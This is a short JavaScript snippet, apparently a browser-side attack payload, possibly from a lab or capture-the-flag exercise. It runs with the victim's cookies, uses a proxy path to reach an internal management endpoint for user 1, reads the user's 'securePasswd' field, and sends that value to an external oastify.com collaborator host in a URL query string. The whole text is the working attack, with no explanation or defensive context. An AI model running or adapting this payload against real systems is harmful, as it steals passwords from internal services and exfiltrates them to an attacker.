
(async () => {
  try {
    const response = await fetch("https://10.210.34.88/go/http://127.0.0.1:12345/management/users/1", {
      credentials: "include"
    });

    const json = await response.json();
    const passwdValue = json.securePasswd;
    const exfilUrl = `https://10.210.34.88/go/https://6elcp88rra3cnmz6qr6owuzbp2vtjm7b.oastify.com/?log=${encodeURIComponent(passwdValue)}`;


    await fetch(exfilUrl, {
      method: "GET",
      mode: "no-cors"
    });

  } catch (err) {
    console.error("Hata:", err);
  }
})();
